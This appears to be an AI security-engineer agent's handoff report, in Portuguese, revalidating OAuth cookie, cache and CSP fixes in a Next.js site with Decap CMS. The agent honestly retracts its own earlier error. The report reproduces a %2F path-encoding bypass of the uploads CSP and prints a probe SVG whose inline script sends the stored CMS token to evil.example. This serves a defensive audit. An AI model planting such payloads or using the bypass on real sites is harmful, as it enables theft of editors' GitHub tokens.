# Handoff 41 — Security Engineer — Fase 5, REVALIDAÇÃO das correções (SEC-P5-01/02/03/04)

**Task:** 001-migracao-stack
**Agente:** security-engineer
**Âmbito:** revalidação **por execução própria** das correções descritas em
`handoff-40-developer-fase5-fix.md`, contra o código atual em `app/api/auth/route.ts`,
`app/api/auth/callback/route.ts`, `lib/auth/env.ts`, `next.config.mjs`,
`public/admin/config.yml`. **Não** cobre a Fase 6. **Não** re-investiga o SEC-01 (ver nota no fim).
**Método:** `npm run build` + cinco instâncias de `next start` com `OAUTH_ALLOWED_ORIGIN`
diferentes, `curl`, e um `--require` que intercepta apenas as duas chamadas de saída para o
GitHub (para exercitar o **caminho de sucesso** com um token-sentinela). Nenhum handoff foi
aceite como evidência — reproduzi tudo.

---

STATUS: APPROVED — **condicionado, e com um achado NOVO que reabre o SEC-P5-03**

Sem ambiguidade:
- **SEC-P5-01 — FECHADO.** Verificado por execução em todos os caminhos, incluindo o de sucesso.
- **SEC-P5-02 — FECHADO.** Verificado por execução nos três cookies e nos 22 casos de
  `isValidOrigin()`, contra o módulo real e não contra uma cópia.
- **SEC-P5-04 — FECHADO** enquanto documentação (era só isso que eu tinha pedido).
- **SEC-P5-03 — NÃO FECHADO.** A correção **a** está implementada corretamente, mas
  **demonstrei que é contornável** com um único caractere codificado no URL. Ver SEC-P5-09.
  Isto não é culpa do developer: é a minha própria frase "qualquer uma fecha" que estava errada,
  e retiro-a formalmente abaixo.
- Nenhuma vulnerabilidade `high` ou `critical` foi introduzida por estas correções. **Não
  bloqueio o avanço.** Os dois bloqueadores de deploy que eu tinha (SEC-P5-01, SEC-P5-02) estão
  levantados; o bloqueador do **segundo editor / Fase 6** (SEC-P5-03) mantém-se, agora com prova
  reproduzível de que ainda está aberto.

---

SUMMARY:

Duas das três correções obrigatórias estão feitas e feitas bem — não só "aplicadas", mas
verificadas no comportamento observável do servidor, incluindo os caminhos que o developer só
pôde justificar por leitura do código (o de sucesso do callback, que é justamente o que
transporta o token). O `X-Forwarded-Proto` deixou de ter qualquer efeito sobre o atributo
`Secure`, e `isValidOrigin()` rejeita agora http de produção sem exceção — verifiquei os dois
sentidos, e também que não abriu buracos novos (`http://evil.localhost`,
`http://localhost.evil.com`, `http://user:pw@localhost`, `http://localhost:3000@evil.com`,
`http://127.1`, `http://[::1]` — todos rejeitados). As duas CSP (global e `/admin`) continuam
byte a byte iguais às que aprovei no handoff-39: a entrada nova não regrediu nada.

O que mudou a minha avaliação do SEC-P5-03 é um resultado que só apareceu porque testei com um
ficheiro **realmente servido**, e não apenas com um caminho inventado:

```
GET /images/uploads/xss-probe.svg     -> 200, Content-Security-Policy: sandbox; default-src 'none'   (protegido)
GET /images/uploads%2Fxss-probe.svg   -> 200, MESMO CORPO, CSP GLOBAL com script-src 'self' 'unsafe-inline'
```

O mesmo ficheiro, na mesma origem, servido com a política errada porque a barra vem codificada.
A entrada `source: "/images/uploads/:path*"` faz o matching **antes** da normalização que o
servidor de ficheiros estáticos aplica depois — e a cadeia de ataque que descrevi no SEC-P5-03
(SVG com script inline -> mesma origem que `/admin` -> `localStorage` -> token com scope
`public_repo` de outro editor) volta a estar inteira, com um URL que qualquer pessoa consegue
escrever à mão.

**Retiro explicitamente a frase "qualquer uma fecha" do handoff-39.** Estava assente numa
premissa que não verifiquei na altura: que uma CSP presa a um `source` cobre todos os URL que
servem aquele ficheiro. Não cobre. Um controlo cuja eficácia depende de como um servidor
normaliza caminhos não é um controlo que eu possa dar por fechado sem o testar em cada
normalização — e há pelo menos uma em que falha.

**Sobre a decisão que o developer me pediu explicitamente:** aceito integralmente a investigação
dele sobre a correção **b** e **retiro esse pedido**, mas por uma razão mais forte do que a que
ele deu. Não é só que a chave não exista no Decap 3.15.1 — confirmei que não existe, o `accept`
do input é literalmente `accept:t?"image/*":"*/*"` no bundle e a única outra ocorrência de
`accept:` é uma tabela de propriedades HTML do `property-information`, sem relação. É que
**`accept` num `<input type="file">` nunca teria sido um controlo de segurança**: é uma dica de
UI do lado do cliente, e o adversário do SEC-P5-03 é precisamente o editor que está a operar
esse cliente. Ele desliga-a com o devtools ou faz o commit direto pela API do GitHub, que é como
o backend `github` do Decap escreve de qualquer maneira. A correção **b**, tal como eu a
escrevi, teria protegido contra um engano, não contra o ataque que eu próprio descrevi. O erro
foi meu, não do developer, e ele fez o correto ao não escrever no `config.yml` uma chave que o
Decap ignoraria — isso teria sido pior do que nada.

Fica então a pergunta certa: **o que fecha mesmo o SEC-P5-03?** Só um controlo que o editor não
possa contornar a partir do browser dele. Das opções que o developer listou, a que resolve é a
segunda: uma verificação em CI que impeça a existência do ficheiro. Detalhe em SEC-P5-09.

---

ARTIFACTS:
- `project/state/task-001-migracao-stack/handoff-41-security-engineer-fase5-revalidacao.md` (este ficheiro)
- **Nenhum ficheiro de código criado ou alterado por mim.** Durante o teste do SEC-P5-03 criei
  temporariamente `public/images/uploads/xss-probe.svg` e `.html` (necessários porque o
  `next start` só serve ficheiros de `public/` que existiam no momento do `npm run build` — sem
  isto só se testam 404, que não provam nada). **Ambos apagados**, a pasta
  `public/images/uploads/` removida, e `npm run build` corrido de novo para limpar o output.
  `git status` confirmado sem qualquer vestígio (`grep -i uploads` -> vazio).
- Ambiente: build de produção + `next start` em :3301 (`OAUTH_ALLOWED_ORIGIN=http://localhost:3301`),
  :3302 (`https://example.com`), :3303 (`http://agrotrades.co.mz` — inválido de propósito),
  :3304 (`http://127.0.0.1:3304`), :3305 (rebuild com os ficheiros-sonda). Sentinelas:
  `GITHUB_OAUTH_CLIENT_SECRET=secret_do_not_leak_ABC123`, `SESSION_SECRET` de 46 caracteres,
  `GITHUB_OAUTH_CLIENT_ID=fake_client_id_ABC`, token falso `gho_FAKETOKEN_SENTINEL_9999`.
  Todos os processos terminados; nada ficou a correr.

---

VALIDATIONS

### SEC-P5-01 — `Cache-Control: no-store` — FECHADO

```
:3301 GET /api/auth?provider=github            -> 302  cache-control: no-store
:3302 GET /api/auth?provider=evil              -> 400  cache-control: no-store
:3302 GET /api/auth        (sem provider)      -> 400  cache-control: no-store
:3303 GET /api/auth        (config invalida)   -> 500  cache-control: no-store
:3301 GET /api/auth/callback?code=x&state=bad  -> 400  cache-control: no-store
:3301 GET /api/auth/callback?code=x            -> 400  cache-control: no-store
:3301 GET /api/auth/callback?state=<valido>    -> 400  cache-control: no-store
:3301 GET /api/auth/callback   (sem nada)      -> 400  cache-control: no-store
:3303 GET /api/auth/callback   (config null)   -> 500  cache-control: no-store
```

**E o que interessava mesmo — o caminho de SUCESSO**, que o developer só justificou por ser "o
mesmo caminho de código". Exercitei-o de facto, com o GitHub interceptado:

```
:3302 GET /api/auth/callback?code=fakecode&state=<valido>
-> HTTP/1.1 200 OK
   cache-control: no-store
   content-type: text/html; charset=utf-8
   set-cookie: agrotrades_oauth_state=; ...; Max-Age=0; Secure; HttpOnly; SameSite=lax
   set-cookie: agrotrades_session=eyJpZCI6NDI0MjQyLCJleHAiOjE3ODc3NTk2NjJ9...; Path=/admin;
               Max-Age=3600; Secure; HttpOnly; SameSite=strict
   corpo contem gho_FAKETOKEN_SENTINEL_9999: SIM (1 ocorrencia)
```

A resposta que transporta a credencial tem `no-store`. É exatamente isto que eu tinha exigido, e
agora está provado e não deduzido. Sem `Pragma`/`Expires` adicionais — desnecessários,
`no-store` em HTTP/1.1 basta e a Vercel deixa de aplicar o `public, max-age=0` por omissão.
Nenhum cabeçalho de cache residual problemático (`vary: rsc,...` apenas, inócuo).

### SEC-P5-02 — `Secure` vem da configuração — FECHADO

Inversão do teste que provou a falha no handoff-39:

```
:3301 (OAUTH_ALLOWED_ORIGIN=http://localhost:3301)
  sem header                       -> set-cookie: ...; HttpOnly; SameSite=lax     (sem Secure)
  com X-Forwarded-Proto: https     -> set-cookie: ...; HttpOnly; SameSite=lax     (sem Secure)
  com X-Forwarded-Proto: https
      + X-Forwarded-Host: evil.example
      + Origin: https://evil.example
      + &redirect_uri=https://evil.example/steal
                                   -> set-cookie: ...; HttpOnly; SameSite=lax     (sem Secure)
                                      location redirect_uri=http%3A%2F%2Flocalhost%3A3301%2F...
                                      (o parametro e os headers do atacante continuam sem efeito)

:3302 (OAUTH_ALLOWED_ORIGIN=https://example.com), pedido em HTTP simples, sem TLS nenhum
  sem header                       -> set-cookie: ...; Secure; HttpOnly; SameSite=lax
```

O header do pedido deixou de decidir. A configuração decide. Confirmado nos **três** pontos:
cookie de state em `/api/auth`, apagamento do cookie de state em `finish()`, e cookie de sessão.

**Fallback quando `config` é `null`** (o ponto que o developer acrescentou por iniciativa própria
e que eu não tinha pedido — está certo):

```
:3303 (OAUTH_ALLOWED_ORIGIN=http://agrotrades.co.mz -> rejeitado, config null)
  GET /api/auth/callback?code=x&state=y
  -> 500, cache-control: no-store
     set-cookie: agrotrades_oauth_state=; Max-Age=0; Secure; HttpOnly; SameSite=lax
```

Falha para o lado **restritivo** (`Secure` presente), não para o permissivo. Correto.

**`isValidOrigin()` — 22 casos contra o módulo REAL** (`lib/auth/env.ts` importado diretamente,
não uma cópia da lógica; exercitado através de `readOAuthConfig()`, o seu único consumidor):

```
OK  "http://localhost:3000"           -> true       OK  "http://agrotrades.co.mz"        -> false
OK  "http://localhost"                -> true       OK  "http://evil.localhost"          -> false
OK  "http://127.0.0.1:3000"           -> true       OK  "http://localhost.evil.com"      -> false
OK  "https://agrotrades.co.mz"        -> true       OK  "http://LOCALHOST:3000"          -> false
                                                    OK  "http://127.0.0.2:3000"          -> false
                                                    OK  "http://127.1"                   -> false
                                                    OK  "http://[::1]:3000"              -> false
                                                    OK  "http://user:pw@localhost:3000"  -> false
                                                    OK  "http://localhost:3000@evil.com" -> false
                                                    OK  "https://agrotrades.co.mz/"      -> false
                                                    OK  "https://agrotrades.co.mz/x"     -> false
                                                    OK  "ftp://localhost"                -> false
                                                    OK  "javascript:alert(1)"            -> false
                                                    OK  "data:text/html,x"               -> false
                                                    OK  "//agrotrades.co.mz"             -> false
                                                    OK  ""                               -> false
                                                    OK  "HTTP://localhost:3000"          -> false
TODOS OS CASOS COMO ESPERADO (22/22)
```

O que eu pedi está lá, e o que eu não pedi mas verifiquei também: a comparação é de **hostname
exato**, não sufixo (`evil.localhost` cai), não prefixo (`localhost.evil.com` cai), e a
verificação `url.origin === value` neutraliza userinfo e caminhos acrescentados. Confirmado
end-to-end: `:3303`, com um `OAUTH_ALLOWED_ORIGIN` de produção em http, **recusa arrancar o
fluxo** — 500 genérico, sem cookie, motivo só nos logs. Era exatamente o cenário de "falha aberta
em silêncio" que motivou o SEC-P5-02.

Nota lateral, sem severidade: `http://[::1]` é rejeitado. É uma inconveniência de
desenvolvimento, não um problema — quem precisar usa `localhost`.

### SEC-P5-03a — entrada de CSP em `/images/uploads/:path*` — implementada, **e contornável**

Com ficheiros **realmente servidos** (rebuild com `xss-probe.svg` e `xss-probe.html` dentro de
`public/images/uploads/`, ambos apagados depois):

```
GET /images/uploads/xss-probe.svg
-> 200  Content-Type: image/svg+xml
        X-Content-Type-Options: nosniff
        Content-Security-Policy: sandbox; default-src 'none'          <- PROTEGIDO
        (X-Frame-Options, HSTS, Referrer-Policy, Permissions-Policy herdados da entrada global,
         porque esta entrada nao redefine essas chaves — comportamento correto e verificado)

GET /images/uploads/xss-probe.html          -> 200  sandbox; default-src 'none'   PROTEGIDO
GET /images/uploads/./xss-probe.svg         -> 200  sandbox; default-src 'none'   PROTEGIDO
GET /images/../images/uploads/xss-probe.svg -> 200  sandbox; default-src 'none'   PROTEGIDO
GET /IMAGES/uploads/xss-probe.svg           -> 404                                (irrelevante)
GET /images/uploads%252Fxss-probe.svg       -> 404                                (irrelevante)

GET /images/uploads%2Fxss-probe.svg
-> 200  Content-Type: image/svg+xml
        corpo: <svg ...><script>location="https://evil.example/?t="+localStorage.getItem(...)</script></svg>
        Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; ...
                                                                       <- NAO PROTEGIDO
GET /images%2Fuploads%2Fxss-probe.svg
-> 200  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; ...
                                                                       <- NAO PROTEGIDO
```

Mesmo ficheiro. Mesma origem. Política diferente. Ver SEC-P5-09.

### SEC-P5-03b — a chave não existe mesmo — confirmado por mim, e o pedido é retirado

```
grep -o 'type:"file"[^}]\{0,90\}' public/admin/vendor/decap-cms/decap-cms.js
-> type:"file",accept:t?"image/*":"*/*",onChange:n,disabled:r

grep -o 'allowed_extensions\|allowedExtensions\|accept:[^,}]\{0,40\}' ... | sort -u
-> accept:"*/*"                 (widget de ficheiro generico)
   accept:t?"image/*":"*/*"
   accept:d                     -> contexto inspecionado: tabela de propriedades HTML do
                                   `property-information` ({abbr:null, accept:d, acceptCharset:c,
                                   ...}), sem qualquer relacao com configuracao de upload

decap-cms 3.15.1 (package.json)
```

A afirmação do developer confere. E, como escrevi no SUMMARY, mesmo que conferisse ao contrário,
`accept` é UI do cliente e não vale como controlo contra o editor. **Pedido retirado.**

### SEC-P5-04 — comentário — FECHADO

`app/api/auth/callback/route.ts:165-169`, imediatamente acima de `path: "/admin"`, no
`cookies.set(SESSION_COOKIE, ...)`. Nomeia as três saídas possíveis (alargar Path para `/`, Path
próprio, ou mover as rotas para `/admin/api/`) e diz que a decisão é **na** Fase 6 e não a meio
dela. É o que eu pedi e diz o que precisa de dizer. Sem alteração de comportamento — confirmado
no `Set-Cookie` real: `Path=/admin`, inalterado.

### Não-regressão — as duas CSP continuam exatamente as que aprovei

```
/admin  e  /admin/config.yml :
  default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob: https://avatars.githubusercontent.com; font-src 'self' data:;
  connect-src 'self' https://api.github.com https://github.com https://objects.githubusercontent.com;
  frame-src 'none'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';
  upgrade-insecure-requests

/ , /servicos , /api/auth , /images/logo.png :
  default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self';
  frame-src 'self' https://www.youtube-nocookie.com https://www.google.com; object-src 'none';
  base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests
```

**Byte a byte idênticas às do handoff-39, ponto 10.** A entrada nova não vazou nada para a global
nem alterou a de `/admin`; `/images/logo.png` (fora de uploads) mantém a global, como deve. A
ordem no array continua correta.

### Não-regressão — o resto do handoff-39 continua de pé

```
redirect_uri influenciavel por query/Origin/X-Forwarded-Host   -> NAO (reverificado acima)
scope                                                          -> public_repo, allow_signup=false
TARGET_ORIGIN no HTML servido                                  -> var TARGET_ORIGIN = "http://localhost:3301"  (literal)
postMessage com "*" no nosso HTML                              -> 0 ocorrencias
corpos dos 4 modos de falha do callback (md5)                  -> IDENTICOS (02871954056f...) — sem oraculo
cookie de state apagado em TODAS as saidas                     -> sim, incluindo as de erro
payload da sessao                                              -> {"id":424242,"exp":...}, sem token, TTL 3600 absoluto
sentinelas em /admin, /admin/config.yml, decap-cms.js, /       -> 0, 0, 0, 0
sentinelas em .next e public                                   -> nenhum ficheiro
NEXT_PUBLIC na fonte                                           -> 1 ocorrencia, num comentario a proibi-lo
process.env na fonte                                           -> lib/auth/env.ts (4) + next.config.mjs (NODE_ENV)
```

Nada regrediu. `npm run build` compila sem erros; `/api/auth` e `/api/auth/callback` continuam
dinâmicas (`ƒ`).

---

ISSUES

| Ref | Severidade | Título | Estado |
|---|---|---|---|
| SEC-P5-01 | medium | Token no corpo sem `Cache-Control` | **FECHADO** — reverificado |
| SEC-P5-02 | medium | `Secure` derivado do pedido | **FECHADO** — reverificado |
| SEC-P5-04 | low-medium | `Path=/admin` vs `/api/admin/*` da Fase 6 | **FECHADO** enquanto documentação |
| SEC-P5-03 | **medium** | SVG na media library rouba o token de outro editor | **ABERTO** — mitigado em parte |
| SEC-P5-09 | **medium** | **NOVO** — CSP presa a `source` contornável com `%2F`, reabre o SEC-P5-03 | **ABERTO** |
| SEC-P5-10 | low | **NOVO** — comentário em `next.config.mjs` afirma um controlo que não existe | **ABERTO** |
| SEC-P5-05/06/07/08 | low | Residuais do handoff-39 | inalterados, aceites |
| SEC-01 (herdado) | **high** | Segredos no ambiente Preview da Vercel | **ABERTO** — fora deste âmbito |

#### SEC-P5-09 — medium — NOVO — A CSP de `/images/uploads/:path*` é contornável com `%2F`

Reprodução completa, do zero:

```
1. mkdir -p public/images/uploads
2. criar public/images/uploads/xss-probe.svg com o conteudo:
   <svg xmlns="http://www.w3.org/2000/svg"><script>location="https://evil.example/?t="+localStorage.getItem("decap-cms-user")</script></svg>
3. npm run build && next start -p 3305
4. curl -s --path-as-is -D - "http://localhost:3305/images/uploads%2Fxss-probe.svg"
   -> 200, Content-Type: image/svg+xml, corpo integral,
      Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; ...
```

A entrada de `headers()` compara o caminho **antes** de a barra codificada ser resolvida; o
servidor de ficheiros estáticos resolve-a **depois** e entrega o ficheiro. Resultado: um URL
canonicamente equivalente entrega o mesmo conteúdo sob a CSP global, com
`script-src 'self' 'unsafe-inline'`. Um SVG assim, aberto como documento de topo, executa, lê o
`localStorage` da mesma origem que `/admin` — onde o Decap guarda o token — e sai por navegação
de topo, que a CSP não restringe (`navigate-to` não existe nos browsers). A cadeia inteira do
SEC-P5-03 volta a estar completa. Confirmado também com `/images%2Fuploads%2F...` e com o `.html`.

Severidade: **medium**, a mesma do SEC-P5-03, porque o impacto e as pré-condições são os mesmos —
exige um editor já autenticado a carregar o ficheiro, um **segundo** editor, e um empurrão social
para o abrir como documento de topo. Hoje há um único editor: risco efetivo nulo. No instante em
que houver dois, é real, e o que se rouba é um token `public_repo` que dá escrita em **todos os
repositórios públicos da vítima**, não só neste.

**O que ainda não sei, e não finjo saber:** este resultado é do `next start` em runtime Node. Na
Vercel os ficheiros de `public/` são servidos pela CDN, com as regras de `headers()` compiladas
para a configuração de rotas da plataforma, e a normalização de `%2F` pode ser outra — melhor ou
pior. **Não o testei e não o presumo em nenhum dos sentidos.** É precisamente por isto que a
correção não pode assentar em matching de caminho: a semântica de normalização não é nossa, muda
com a plataforma, e pode mudar sem nos avisar.

**Correção exigida — uma medida que não dependa de matching de caminho:**

O único controlo que o adversário (um editor com escrita) não consegue contornar do browser dele
é impedir que o ficheiro **exista**. Concretamente, e é a opção (ii) que o próprio developer
listou:

- **GitHub Action obrigatório** que falhe qualquer PR que adicione ou modifique, sob
  `public/images/uploads/`, um ficheiro que não seja raster (lista de permissão:
  `.jpg .jpeg .png .webp .gif .avif`; recusa explícita de `.svg .svgz .htm .html .xhtml .xml`).
  Deve ser um **required check** na proteção do branch `main` — caso contrário é um aviso, não um
  controlo. Isto encaixa exatamente no `publish_mode: editorial_workflow` que já está configurado
  (tudo passa por PR) e na proteção de `main` que já era pré-condição da Fase 6.
- **Manter a entrada de CSP** que o developer criou. Continua a valer: cobre o caminho canónico,
  é defesa em profundidade e custa zero. Só não pode ser a **única** camada.
- Alternativa igualmente aceitável, se o Architect preferir: servir a media por um route handler
  próprio que ponha os cabeçalhos na resposta (imune a normalização de caminho) — mas isso implica
  que os ficheiros deixem de estar em `public/`, o que é uma alteração de arquitetura e não uma
  correção. Decisão do Architect, não minha.

Isto é decisão de **CI/arquitetura**, e o developer teve razão em registá-la em vez de a
implementar por conta própria. Encaminho-a formalmente: é do `devops-engineer` (o workflow e o
required check) com validação do `software-architect`.

#### SEC-P5-10 — low — Um comentário afirma um controlo que não existe

`next.config.mjs`, linhas 132-134:

```
// Cumulativo com a restrição de extensões em config.yml (raster
// apenas) — nenhuma das duas medidas sozinha seria suficiente contra
// um ficheiro já publicado antes da restrição de extensão existir.
```

Essa restrição **não existe** — o próprio developer demonstrou, no mesmo lote de alterações, que
não é implementável, e documentou-o corretamente em `public/admin/config.yml`. Ficou um
comentário órfão a afirmar o contrário, no ficheiro que é a **única** defesa realmente presente.
Quem ler `next.config.mjs` daqui a seis meses conclui que há duas camadas quando há uma — e,
depois do SEC-P5-09, quando na prática há menos de uma.

É `low` porque não altera comportamento nenhum. Corrijo-o na mesma, e insisto: no handoff-39
escrevi que "uma mitigação assente numa razão errada é frágil". Um comentário errado sobre um
controlo de segurança é a forma mais barata de fabricar essa fragilidade.

**Correção:** substituir por uma referência ao que existe de facto — o comentário do `config.yml`
e o SEC-P5-09 deste handoff — e, quando o GitHub Action existir, apontar para ele.

#### SEC-P5-03 — mantém-se ABERTO

Não é uma reprovação da correção **a**: essa está bem feita, verificada, e fica. É que o achado
que ela devia fechar continua alcançável (SEC-P5-09). Precondição, como já estava: **antes do
primeiro editor adicional / da Fase 6**, não deste deploy.

#### SEC-P5-05, 06, 07, 08 — inalterados

Nada nestas correções lhes tocou. Continuam aceites nos termos do handoff-39. Em particular o
`npm audit` (34 `high` que colapsam em 2 advisories de DoS no cliente, sem correção disponível)
mantém-se como lá está — avaliado contextualmente como `low`, com notificação humana obrigatória.

---

BLOCKERS:

- **Nenhum para o avanço.** O código segue para o `tester` e para o `code-reviewer`.
- **Para o deploy da Fase 5 num origin real:** os dois que eu tinha (SEC-P5-01, SEC-P5-02) estão
  **levantados**. Resta **SEC-01** — não é código, é configuração da Vercel, e é do
  `devops-engineer`. Fora do âmbito desta revalidação por decisão do dono do projeto (o site ainda
  não está publicado), o que o transforma em **pré-condição de deploy**, não em bloqueador de
  hoje. Registo-o como continua a estar: **aberto**.
- **Para a Fase 6 e para o primeiro editor adicional:** SEC-P5-03 **continua a bloquear**, agora
  com prova reproduzível (SEC-P5-09) de que a mitigação atual não basta sozinha. A somar às
  pré-condições que já existiam: proteção de `main` e segredos apenas em Production.

---

REQUIRES_HUMAN_NOTIFICATION: **true**

Por duas razões independentes, qualquer uma suficiente:

1. **SEC-01 continua `high` e continua em aberto.** Foi retirado do âmbito desta revalidação com
   uma justificação que aceito e que faz sentido (o site não está publicado), mas retirar do
   âmbito não é fechar. A regra do `CLAUDE.md` não me deixa margem, e eu não tenho autoridade para
   decidir que "já se sabe, não vale a pena repetir". Repito-o.
2. Os `high` do `npm audit` (SEC-P5-07) continuam a ser software de terceiros com advisories
   abertos e **sem correção disponível**, na página que detém o token. Aceitá-los conscientemente
   continua a não ser decisão só minha.

**O que o Orchestrator deve levar ao utilizador, em concreto:**

- Das três correções obrigatórias, **duas estão fechadas e reverificadas por mim** — as duas que
  bloqueavam o deploy. Esse bloqueio está levantado.
- **A terceira não está fechada, e a causa é uma instrução minha que estava errada.** Eu tinha
  dito que a CSP sozinha chegava; testei e não chega — provei que um único caractere codificado no
  URL (`%2F`) serve o mesmo ficheiro com a política errada. O developer implementou corretamente o
  que eu pedi; o que eu pedi é que era insuficiente.
- O que falta é **um controlo de CI**, não código de aplicação: um GitHub Action obrigatório que
  recuse `.svg`/`.html` na pasta de uploads. Só é preciso **antes de existir um segundo editor** —
  com um único utilizador, o risco é nulo, porque a vítima e o atacante seriam a mesma pessoa.
- Não há nada `high` ou `critical` **novo**. O único `high` continua a ser o SEC-01, que é
  configuração da Vercel e pré-condição de deploy.

---

REQUIRED_NEXT_ACTION:

**Para o `developer`:**
1. **SEC-P5-10** (uma linha) — corrigir o comentário de `next.config.mjs` (linhas 132-134) que
   afirma uma restrição de extensões em `config.yml` que não existe. Substituir pela referência ao
   SEC-P5-09 e à mitigação real. É a única coisa que peço ao developer nesta ronda.
2. **Nada mais.** As correções SEC-P5-01, SEC-P5-02 e SEC-P5-04 estão aceites e não precisam de
   ser tocadas. A entrada de CSP de `/images/uploads/:path*` **mantém-se** — não a remova por ela
   não ser suficiente; é defesa em profundidade válida.

**Para o `devops-engineer` (é aqui que o SEC-P5-03 se fecha):**
1. GitHub Action que recuse, em qualquer PR, ficheiros não-raster sob `public/images/uploads/`
   (permitir `.jpg .jpeg .png .webp .gif .avif`; recusar explicitamente
   `.svg .svgz .htm .html .xhtml .xml`), registado como **required check** na proteção de `main`.
   Sem o required check não é um controlo.
2. A prova do **SEC-01** continua a ser tua e continua a ser pré-condição de deploy.
3. Confirmar que o build da Vercel usa `npm ci` (SEC-P5-08).
4. Se e quando houver um deployment real, reexecutar contra ele o teste do SEC-P5-09
   (`curl --path-as-is "<origem>/images/uploads%2F<ficheiro>.svg"` e verificar qual CSP volta) — a
   CDN da Vercel pode normalizar de outra forma, para melhor ou para pior, e eu não o presumo.

**Para o `software-architect`:** validar a opção de CI acima, ou decidir pela alternativa de
servir a media por route handler. Uma das duas; a que não serve é ficar só com a CSP.

**Para o `tester` (a seguir):** inalterado face ao handoff-39/40 — o comportamento funcional do
Decap, as coleções, e os três ficheiros-array (`stats`, `team`, `locations`). Acrescento só o que
estas correções podem ter perturbado e que um teste funcional apanha: (i) o popup de login fecha e
o Decap fica autenticado apesar do `Cache-Control: no-store`; (ii) o cookie de sessão continua a
ser aceite em `/admin`. Mantenho o lembrete: **os controlos de segurança são invisíveis num teste
funcional** — não repitas os meus testes negativos a pensar que são os teus.

**Para o `code-reviewer` (depois do tester):** os três pontos do handoff-39 mantêm-se
(`targetOrigin` literal — reverifiquei e continua; nenhuma variável de módulo a guardar
credenciais; a entrada de `/admin` em `next.config.mjs` tem de continuar autossuficiente).
Acrescento um quarto: **o `cookiesSecure` de `app/api/auth/callback/route.ts:55` tem um fallback
para `true` quando `config` é `null`.** Está certo e verifiquei-o. Se alguém o "simplificar" para
`config?.allowedOrigin.startsWith("https:") ?? false`, ou para `!!allowedOrigin && ...`, inverte o
sentido da falha sem que nenhum teste funcional se queixe.

**Para mim (`security-engineer`), depois:** verificar o GitHub Action quando existir (contra o
ficheiro do workflow e contra a configuração do required check, não contra a afirmação de que foi
criado), e a revisão da Fase 6, que continua a ser um gate separado.

---

CONTEXT_FOR_NEXT_AGENT:

- **Gate 4 (security) para a Fase 5: mantido, condicionado.** Não é gate para a Fase 6 nem
  autorização de deploy.
- **O que passou a estar fechado e ninguém precisa de reverificar** (fiz por execução, comandos
  acima): `Cache-Control: no-store` em todos os caminhos das duas rotas **incluindo o de sucesso**;
  `Secure` derivado só da configuração nos três cookies, com fallback restritivo;
  `isValidOrigin()` a rejeitar http fora de localhost/127.0.0.1, 22 casos contra o módulo real; as
  duas CSP (global e `/admin`) byte a byte iguais às do handoff-39.
- **O que continua a valer do handoff-39, revalidado de passagem:** `redirect_uri` não
  influenciável pelo pedido; `targetOrigin` literal; `state` de uso único apagado antes de validar;
  ausência de oráculo nos 4 modos de falha; scope `public_repo`; zero segredos no bundle e no
  output de build.
- **O que está aberto e é preciso não perder de vista:**
  - SEC-P5-09/SEC-P5-03 — a CSP de `/images/uploads` é contornável com `%2F`; fecha-se em CI, não
    em código de aplicação; precondição do **segundo editor**, não deste deploy.
  - SEC-P5-10 — comentário errado em `next.config.mjs`, uma linha.
  - SEC-01 — configuração da Vercel, `high`, pré-condição de deploy.
- **Lição de método que interessa a quem vier a seguir, e a mim:** um cabeçalho de segurança preso
  a um `source` de `next.config.mjs` só protege os URL que aquele `source` faz match, e o conjunto
  de URL que servem um ficheiro é maior do que parece. Sempre que uma defesa depender de matching
  de caminho, testar com o ficheiro realmente servido e com variantes codificadas — `%2F`, `.`,
  `..`, maiúsculas. Foi isto que distinguiu esta revalidação da anterior: no handoff-39 avaliei a
  proposta, aqui testei a implementação com um ficheiro a existir de facto.
- **Ficheiros que importam:** `lib/auth/env.ts` (fonte única da origem, e agora também de facto a
  fonte do `Secure`), `lib/auth/popupMessage.ts`, `next.config.mjs` (três entradas de CSP, ordem
  significativa, e o comentário do SEC-P5-10 por corrigir), `public/admin/config.yml`
  (`media_folder`, `base_url` que tem de coincidir byte a byte com `OAUTH_ALLOWED_ORIGIN`, e o
  comentário do SEC-P5-03 que está correto e deve manter-se).
